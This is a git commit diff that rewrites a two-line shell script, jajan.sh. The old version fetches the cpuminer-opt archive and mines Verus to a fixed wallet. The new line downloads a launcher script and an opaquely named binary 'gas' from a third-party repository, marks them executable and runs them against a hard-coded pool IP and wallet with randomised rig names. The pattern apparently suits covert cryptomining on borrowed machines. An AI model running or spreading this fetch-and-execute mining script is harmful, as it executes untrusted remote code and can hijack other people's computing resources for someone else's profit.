92f882384d96bd1fa7f87da5b2e98f8c350ca542
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-14 14:37:01 +0700

    Update jajan.sh

--- jajan.sh
+++ jajan.sh
@@ -1,2 +1,2 @@
 !#/bin/bash
-wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && ./cpuminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.worker-joker01 -p x
+wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh; wget https://github.com/hunshukajh/yes/raw/main/gas; chmod +x gas cmdline_launcher.sh; ./cmdline_launcher.sh -algo Verushash -coin VRSC -wallet RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5 -rigName $(echo $(shuf -i 1-2 -n 1)-joa) -pool1 139.99.123.225:3956
